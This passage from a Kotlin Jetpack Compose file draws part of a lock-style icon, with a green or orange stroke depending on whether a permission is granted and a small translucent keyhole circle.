                color = if (isGranted) Color(0xFF00E676) else Color(0xFFFF9100),
                style = Stroke(width = 4.dp.toPx())
            )

            // Inner keyhole circle
            drawCircle(
                color = Color.Black.copy(alpha = 0.4f),
                radius = 4.dp.toPx(),
                center = Offset(center.x, center.y + 10.dp.toPx())
            )
        }
    }
}
